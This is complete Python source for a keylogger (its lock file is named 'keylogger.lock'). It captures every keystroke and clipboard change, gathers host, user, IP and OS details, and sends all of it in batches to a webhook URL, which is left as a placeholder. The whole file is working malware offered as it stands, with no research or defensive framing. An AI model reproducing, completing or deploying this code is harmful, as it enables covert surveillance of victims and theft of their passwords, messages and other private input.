import requests
from pynput import keyboard
import threading
import time
import socket
import platform
import psutil
import getpass
import pyperclip
import os
import sys
from datetime import datetime, timedelta
import queue

WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE"

# Einzelinstanz verhindern
def prevent_double_execution():
    global lock_handle
    if os.name == "nt":
        import msvcrt
        lockfile = os.path.expandvars(r"%TEMP%\keylogger.lock")
        try:
            lock_handle = open(lockfile, "w")
            msvcrt.locking(lock_handle.fileno(), msvcrt.LK_NBLCK, 1)
        except IOError:
            sys.exit(0)
    else:
        import fcntl
        lockfile = "/tmp/keylogger.lock"
        try:
            lock_handle = open(lockfile, "w")
            fcntl.flock(lock_handle, fcntl.LOCK_EX | fcntl.LOCK_NB)
        except IOError:
            sys.exit(0)

prevent_double_execution()

def get_active_mac():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
    except:
        return "UNKNOWN"
    for interface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == socket.AF_INET and addr.address == local_ip:
                for entry in addrs:
                    if entry.family == psutil.AF_LINK:
                        return entry.address.upper().replace("-", ":")
    return "UNKNOWN"

DEVICE_ID = f"DEVICE-{get_active_mac().replace(':', '')}"


if not WEBHOOK_URL or not WEBHOOK_URL.startswith("http"):
    print("Webhook missing or invalid.")
    time.sleep(1)
    os._exit(1)

log_entries = []
buffer_lock = threading.Lock()
held_keys = set()
modifier_keys = {"CTRL", "SHIFT", "ALT", "ALTGR", "WIN"}
last_clipboard = ""
send_queue = queue.Queue()

def get_public_ip():
    try:
        return requests.get("https://api.ipify.org").text
    except:
        return "Unknown"

def get_local_ip():
    for iface_name, iface_addrs in psutil.net_if_addrs().items():
        stats = psutil.net_if_stats().get(iface_name)
        if not stats or not stats.isup:
            continue
        for addr in iface_addrs:
            if addr.family == socket.AF_INET and not addr.address.startswith("127.") and \
               not any(v in iface_name.lower() for v in ["vmware", "virtual", "loopback", "veth", "docker", "bluetooth"]):
                return addr.address
    return "Unknown"

def get_system_info():
    try:
        os_edition = platform.win32_edition()
    except:
        os_edition = "Unknown"

    hostname = socket.gethostname()
    local_ip = get_local_ip()
    uptime = datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')
    os_version = platform.version()

    return (
        f"**System Info for Device {DEVICE_ID}**\n"
        f"**Hostname:** `{hostname}`\n"
        f"**User:** `{getpass.getuser()}`\n"
        f"**Local IP:** `{local_ip}`\n"
        f"**Public IP:** `{get_public_ip()}`\n"
        f"**OS:** `{platform.system()} {platform.release()} ({os_edition})`\n"
        f"**OS Version:** `{os_version}`\n"
        f"**Uptime Since:** `{uptime}`"
    )

def convert_ctrl_char(char):
    code = ord(char)
    return chr(code + 96) if 1 <= code <= 26 else repr(char)

def beautify_key(key):
    mapping = {
        "enter": "ENTER", "space": "SPACE", "tab": "TAB", "backspace": "BACKSPACE",
        "esc": "ESC", "right": "RIGHT", "left": "LEFT", "up": "UP", "down": "DOWN",
        "shift": "SHIFT", "shift_r": "SHIFT", "ctrl_l": "CTRL", "ctrl_r": "CTRL",
        "alt_l": "ALT", "alt_r": "ALT", "alt_gr": "ALTGR", "delete": "DELETE",
        "cmd": "WIN", "cmd_l": "WIN", "cmd_r": "WIN"
    }
    return mapping.get(key, key)

def sender_thread():
    while True:
        msg = send_queue.get()
        if msg:
            try:
                requests.post(WEBHOOK_URL, json={"content": msg})
            except:
                pass
        send_queue.task_done()

def send_buffer():
    global log_entries
    while True:
        now = datetime.now()
        next_minute = (now + timedelta(minutes=1)).replace(second=0, microsecond=0)
        time.sleep((next_minute - now).total_seconds())
        with buffer_lock:
            if log_entries:
                hostname = socket.gethostname()
                combined = f"**{hostname}**\n" + "\n".join(log_entries)
                send_queue.put(combined)
                log_entries.clear()

def periodic_systeminfo():
    while True:
        time.sleep(1800)
        send_queue.put(get_system_info())

def check_instant_flush():
    with buffer_lock:
        if len("\n".join(log_entries)) >= 1000:
            hostname = socket.gethostname()
            combined = f"**{hostname}**\n" + "\n".join(log_entries)
            send_queue.put(combined)
            log_entries.clear()

def monitor_clipboard():
    global last_clipboard
    while True:
        try:
            clip = pyperclip.paste()
            if clip != last_clipboard:
                last_clipboard = clip
                hostname = socket.gethostname()
                msg = f"**{hostname}**\n**Clipboard:**\n```{clip}```"
                send_queue.put(msg)
        except:
            pass
        time.sleep(1)

def on_press(key):
    global held_keys
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        if hasattr(key, 'char') and key.char:
            key_str = key.char
            if ord(key_str) < 32:
                key_str = convert_ctrl_char(key_str)
        elif hasattr(key, 'vk'):
            try:
                key_str = chr(key.vk) if 32 <= key.vk <= 126 else str(key).replace("Key.", "").lower()
            except:
                key_str = str(key).replace("Key.", "").lower()
        else:
            key_str = str(key).replace("Key.", "").lower()
    except:
        return
    key_str = beautify_key(key_str)

    if key_str.upper() in modifier_keys:
        if key_str.upper() not in held_keys:
            held_keys.add(key_str.upper())
            log_line = f"{ts} | {key_str.upper()}"
            with buffer_lock:
                log_entries.append(log_line)
            check_instant_flush()
        return

    if "ALTGR" in held_keys:
        held_keys.discard("CTRL")
        held_keys.discard("ALT")
    if key_str.upper() in held_keys:
        return
    mods = sorted(held_keys)
    if hasattr(key, 'char') and key.char and "CTRL" not in mods:
        log_line = f"{ts} | {key.char}"
    elif mods:
        log_line = f"{ts} | {' + '.join(mods + [key_str])}"
    else:
        log_line = f"{ts} | {key_str}"
    with buffer_lock:
        log_entries.append(log_line)
    check_instant_flush()

def on_release(key):
    try:
        key_str = str(key).replace("Key.", "").lower()
        key_str = beautify_key(key_str)
        held_keys.discard(key_str.upper())
    except:
        pass

def periodic_alive_ping():
    while True:
        time.sleep(60)
        ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        send_queue.put(f"✅ `{DEVICE_ID}` still alive at `{ts}`")

threading.Thread(target=sender_thread, daemon=True).start()
send_queue.put(get_system_info())
threading.Thread(target=send_buffer, daemon=True).start()
threading.Thread(target=periodic_systeminfo, daemon=True).start()
threading.Thread(target=monitor_clipboard, daemon=True).start()
threading.Thread(target=periodic_alive_ping, daemon=True).start()
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
